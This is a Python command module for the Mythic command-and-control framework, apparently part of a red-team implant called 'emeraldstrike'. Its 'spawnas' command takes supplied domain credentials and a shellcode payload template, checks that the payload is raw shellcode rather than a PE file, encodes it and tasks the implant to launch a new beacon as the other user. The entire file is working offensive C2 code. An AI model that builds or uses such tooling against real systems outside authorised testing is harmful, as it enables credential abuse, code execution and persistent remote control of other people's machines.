from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import base64


class SpawnasArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="template",
                cli_name="Payload",
                display_name="Payload Template (Shellcode)",
                type=ParameterType.Payload,
                description="Select a payload template to generate shellcode from.",
                supported_agents=["emeraldstrike"],
                supported_agent_build_parameters={
                    "emeraldstrike": {"output_type": "bin"},
                },
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
            CommandParameter(
                name="domain",
                type=ParameterType.String,
                description="Domain (use . for local)",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=2)],
            ),
            CommandParameter(
                name="username",
                type=ParameterType.String,
                description="Username",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=3)],
            ),
            CommandParameter(
                name="password",
                type=ParameterType.String,
                description="Password",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=4)],
            ),
        ]

    async def parse_arguments(self):
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception("Require JSON arguments.\n\tUsage: {}".format(SpawnasCommand.help_cmd))


class SpawnasCommand(CommandBase):
    cmd = "spawnas"
    needs_admin = False
    help_cmd = "spawnas -Payload <template> -domain CORP -username admin -password pass"
    description = "Spawn a new beacon as a different user using the specified credentials."
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1134.002"]
    argument_class = SpawnasArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )

        template_uuid = taskData.args.get_arg("template")

        payload_search = await SendMythicRPCPayloadSearch(
            MythicRPCPayloadSearchMessage(PayloadUUID=template_uuid)
        )
        if not payload_search.Success or len(payload_search.Payloads) == 0:
            response.Success = False
            response.Error = f"Failed to find payload template: {template_uuid}"
            return response

        payload = payload_search.Payloads[0]
        if payload.BuildPhase != "success":
            response.Success = False
            response.Error = f"Template payload not built: {payload.BuildPhase}"
            return response

        file_content = await SendMythicRPCFileGetContent(
            MythicRPCFileGetContentMessage(AgentFileId=payload.AgentFileId)
        )
        if not file_content.Success:
            response.Success = False
            response.Error = f"Failed to get payload content: {file_content.Error}"
            return response

        sc_bytes = file_content.Content
        if sc_bytes[:2] == b"MZ":
            response.Success = False
            response.Error = "Template is a PE, not raw shellcode. Rebuild with output_type=bin."
            return response

        taskData.args.add_arg("shellcode_data", base64.b64encode(sc_bytes).decode(), ParameterType.String)
        taskData.args.remove_arg("template")

        domain = taskData.args.get_arg("domain")
        username = taskData.args.get_arg("username")
        response.DisplayParams = f"{domain}\\{username} ({len(sc_bytes)} bytes)"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
